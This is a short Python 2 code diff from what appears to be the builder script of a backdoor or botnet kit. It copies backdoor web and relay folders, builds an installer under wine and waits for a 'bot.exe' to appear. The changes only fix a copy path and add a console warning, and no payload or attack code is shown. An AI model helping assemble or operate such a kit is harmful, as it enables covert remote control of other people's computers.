@@ -90,7 +90,7 @@ def iexplorer():
                 file_write.write(code)
                 file_write.close()
                 #install_relais(panel)
-		copy('backdoor/web_bk/','backdoor/backdoor/web_bk/')
+		copy('backdoor/web_bk/','backdoor/backdoor/web/')
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Configure relais information..."
 	copy('backdoor/relais/', 'backdoor/relais_bk/')
 	file_read = open('backdoor/relais/index.php').read()
@@ -180,6 +180,7 @@ def compile_payload(type):
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Starting installer..."
 	subprocess.call(["wine", "start", 'installer/build.cmd'])
 	walls = 0
+	print "/"+bcolors.WARNING+"!"+bcolors.ENDC+"\\ If popup open please close with <"+bcolors.FAIL+"return"+bcolors.ENDC+"> input."
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Waiting bot.exe"
 	time.sleep(20)
 	while walls == 0:
